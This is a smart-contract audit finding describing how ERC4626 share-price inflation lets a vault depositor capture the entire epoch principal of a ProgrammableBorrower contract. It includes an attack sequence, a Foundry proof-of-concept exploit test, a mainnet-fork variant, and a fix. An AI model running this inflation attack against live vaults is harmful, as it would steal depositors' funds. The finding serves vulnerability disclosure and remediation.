### Title
ERC4626 share inflation can donate the programmable borrower’s entire epoch principal - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
`ProgrammableBorrower._depositToVault` accepts the ERC4626 `deposit` result without requiring a nonzero or economically sufficient share amount. An ordinary vault depositor can inflate the vault’s assets-per-share before `onStartEpoch`; the borrower then deposits all idle pool principal, receives zero shares, and permanently loses claim over those assets.

### Finding Description
During epoch startup, `onStartEpoch` snapshots `underlyingToken.balanceOf(address(this)) + _currentVaultAssets()` as `epochStartVaultAssets` and then deposits the borrower contract’s complete idle underlying balance through `_depositToVault`. [1](#0-0) 

`_depositToVault` records the returned `shares` only in the event and never checks whether the shares are nonzero or worth approximately `_assetAmount`. [2](#0-1) 

The subsequent accounting baseline still uses the pre-deposit asset amount rather than the actual post-deposit vault position. [3](#0-2) 

The ERC4626 interface permits a vault to return a share amount based on its own conversion logic; the local interface explicitly models `deposit` as returning `shares`, making the returned value the authoritative outcome of the deposit. [4](#0-3) 

This is analogous to continuing after a failed allocation: the assets are transferred, but the claimed asset-tracking position can be zero or negligible while `epochAccountingActive` is marked active.

### Impact Explanation
An attacker who is merely a user of the configured ERC4626 vault can perform a standard first-depositor/share-price inflation sequence:

1. Deposit `1` unit into an empty or near-empty vulnerable ERC4626 vault.
2. Donate more than the expected credit-vault principal `P` directly to the vault so that `P * totalSupply / totalAssets` rounds to zero.
3. Wait for the honest manager to call `IdleCDOEpochVariant.startEpoch`.
4. `ProgrammableBorrower` transfers `P` into the vault and receives zero shares.
5. The attacker redeems their inflated share position and captures approximately all of `P`, net of the deliberately donated amount.

`availableToBorrow` later uses `underlyingToken.balanceOf` plus `convertToAssets(vault.balanceOf)`, so the programmable borrower reports zero deployable assets despite `epochStartVaultAssets == P`. [5](#0-4) 

The loss is the entire first deposited borrower-sleeve principal `P`. Recovery requires extracting value from the external vault, but the borrower has no corresponding shares. Subsequent close-pool or withdrawal funding can therefore default because `onStopEpoch` cannot turn the missing vault position into underlying cash. [6](#0-5) 

### Likelihood Explanation
Likelihood depends on the selected external vault. ERC4626 vaults with existing supply or virtual-share protection are not exploitable through this path. However, deployment accepts any ERC4626 whose `asset` matches the CDO token, and there is no minimum-share, preview-share, or post-deposit valuation check in `initialize`, `setVault`, or `_depositToVault`. [7](#0-6) [8](#0-7) 

The required attacker capability is intentionally in scope: they only need to deposit into and donate assets to the external vault before the epoch starts. The manager’s `startEpoch` call remains honest and merely triggers the already-present accounting flaw.

### Recommendation
Require the ERC4626 deposit to mint an economically adequate position before updating borrower accounting:

```solidity
// contracts/strategies/idle/ProgrammableBorrower.sol
uint256 expectedShares = vault.convertToShares(_assetAmount);
uint256 shares = vault.deposit(_assetAmount, address(this));

if (shares == 0) revert InvalidAmount();
if (vault.convertToAssets(shares) < _assetAmount * BPS_TOLERANCE / 10_000) {
    revert InvalidAmount();
}
```

A stronger implementation should pass an explicit `minSharesOut` derived from a pre-deposit quote and revert when `shares < minSharesOut`. The same protection should cover direct `deposit` calls in `_depositToVault`, while `mint(shares, receiver)` can alternatively be used to make the required share amount explicit.

### Proof of Concept
A Foundry PoC can use a standards-conforming inflation-vulnerable ERC4626 mock and the production `ProgrammableBorrower` flow:

```solidity
contract InflationVault is ERC20 {
    IERC20Detailed public immutable assetToken;

    constructor(address asset_) ERC20("Vault Share", "vSHARE") {
        assetToken = IERC20Detailed(asset_);
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function totalAssets() public view returns (uint256) {
        return assetToken.balanceOf(address(this));
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? shares : shares * totalAssets() / supply;
    }

    function convertToShares(uint256 assets) public view returns (uint256) {
        uint256 supply = totalSupply();
        uint256 assets_ = totalAssets();
        return supply == 0 || assets_ == 0 ? assets : assets * supply / assets_;
    }

    function deposit(uint256 assets, address receiver)
        external
        returns (uint256 shares)
    {
        shares = convertToShares(assets); // rounds down; can be zero
        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        assets = convertToAssets(shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }

    // Remaining IERC4626 methods can return ordinary unlimited values.
}
```

Test sequence:

```solidity
function testStartEpochAcceptsZeroShares() external {
    uint256 poolPrincipal = 10_000e6;
    address vaultUser = makeAddr("vaultUser");

    // Vault share inflation: 1 asset mints 1 share, then the donation
    // makes the pool deposit smaller than one share.
    underlying.mint(vaultUser, 1 + 2 * poolPrincipal);
    vm.startPrank(vaultUser);
    underlying.approve(address(vault), type(uint256).max);
    vault.deposit(1, vaultUser);
    underlying.transfer(address(vault), 2 * poolPrincipal);
    vm.stopPrank();

    // Give the honest programmable borrower its normal epoch principal.
    underlying.mint(address(programmableBorrower), poolPrincipal);

    vm.prank(address(cdoEpoch));
    programmableBorrower.onStartEpoch(0);

    assertEq(vault.balanceOf(address(programmableBorrower)), 0);
    assertEq(programmableBorrower.epochStartVaultAssets(), poolPrincipal);
    assertEq(programmableBorrower.totalUnderlying(), 0);

    vm.prank(vaultUser);
    vault.redeem(1, vaultUser, vaultUser);

    assertApproxEqAbs(
        underlying.balanceOf(vaultUser),
        3 * poolPrincipal + 1,
        1
    );
}
```

On a mainnet fork, substitute the configured ERC4626 vault for `InflationVault` and use its public deposit plus direct-asset donation/share-price manipulation path. The production assertion is the same: `vault.deposit` succeeds, `vault.balanceOf(programmableBorrower)` remains zero or dust, and `epochAccountingActive` becomes true while the borrower has no recoverable vault position.
